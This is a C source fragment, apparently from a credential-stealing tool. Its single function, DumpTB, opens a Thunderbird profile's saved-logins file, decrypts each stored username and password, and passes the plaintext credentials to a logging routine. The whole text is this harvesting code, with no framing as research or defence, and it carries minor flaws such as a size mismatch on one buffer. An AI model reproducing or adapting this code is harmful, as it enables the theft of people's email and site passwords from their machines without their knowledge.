int DumpTB(WCHAR *profilePath, WCHAR *signonFile)
{
	WCHAR signonFullFile[MAX_PATH];
	char buffer[2048];
	int bufferLength = 2048;
	FILE *ft = NULL;

	struct tbp_entry {
		WCHAR service[64];
		WCHAR resource[255];
		WCHAR user_name[255];
		WCHAR user_value[255];
		WCHAR pass_name[255];
		WCHAR pass_value[255];
	} tbentry;

	memset(&tbentry, 0, sizeof(tbentry));

	if ( profilePath == NULL || signonFile == NULL)
		return 0;

	_snwprintf_s(signonFullFile, MAX_PATH, L"%s\\%s", profilePath, signonFile);

	if ( (ft = _wfopen(signonFullFile, L"r")) == NULL ) 
		 return 0;

	fgets(buffer, bufferLength, ft);

	// Read out the unmanaged ("Never remember" URL list
	while (fgets(buffer, bufferLength, ft) != 0) {
		// End of unmanaged list
		if (strlen(buffer) != 0 && buffer[0] == '.' && buffer[0] != '#')
			break;
	}

	// read the URL line
	while (fgets(buffer, bufferLength, ft) != 0 ){

		buffer[strlen(buffer)-1] = 0;
		//printf("-> URL: %s \n", buffer);
		swprintf_s(tbentry.service, 255, L"Thunderbird");
		_snwprintf_s(tbentry.resource, 255, _TRUNCATE, L"%S", buffer);

		//Start looping through final singon*.txt file
		while (fgets(buffer, bufferLength, ft) != 0 ) {

			// new entry begins with '.'
			if (!strncmp(buffer, ".", 1)) {
				if (wcscmp(tbentry.user_name, L""))
					LogPassword(tbentry.service, tbentry.resource, tbentry.user_value, tbentry.pass_value);
				
				memset(&tbentry.user_value, 0, sizeof(tbentry.user_value));
				memset(&tbentry.user_name, 0, sizeof(tbentry.user_name));
				memset(&tbentry.pass_value, 0, sizeof(tbentry.pass_value));
				memset(&tbentry.pass_name, 0, sizeof(tbentry.pass_name));
				
				break; // end of cache entry
			}

			//Check if its a password
			if (buffer[0] == '*') {
				buffer[strlen(buffer)-1] = 0;
				_snwprintf_s(tbentry.pass_name, 255, _TRUNCATE, L"%S", buffer + 1);
				
				fgets(buffer, bufferLength, ft);
				buffer[strlen(buffer)-1] = 0;
				
				Decrypt(buffer+1, tbentry.pass_value, 255);

			} else if (!wcscmp(tbentry.user_name, L"")) {
				buffer[strlen(buffer)-1] = 0;
				_snwprintf_s(tbentry.user_name, 255, _TRUNCATE, L"%S", buffer);

				fgets(buffer, bufferLength, ft);

				if (!strcmp(buffer, "~\n")) {
					// the username is inside the resource
					WCHAR *u;
					
					wcsncpy(tbentry.user_value, tbentry.resource, 255);

					if ((u = wcsstr(tbentry.user_value, L"://")) != NULL) {
						u += wcslen(L"://");
						swprintf_s(tbentry.user_value, 255, L"%s", u);
						if ((u = wcschr(tbentry.user_value, L'@')) != NULL)
							*u = 0;
					}
				} else {
					buffer[strlen(buffer)-1] = 0;
					Decrypt(buffer+1, tbentry.user_value, 255);
				}
			}
		}
	}

	fclose(ft);

	return 1;
}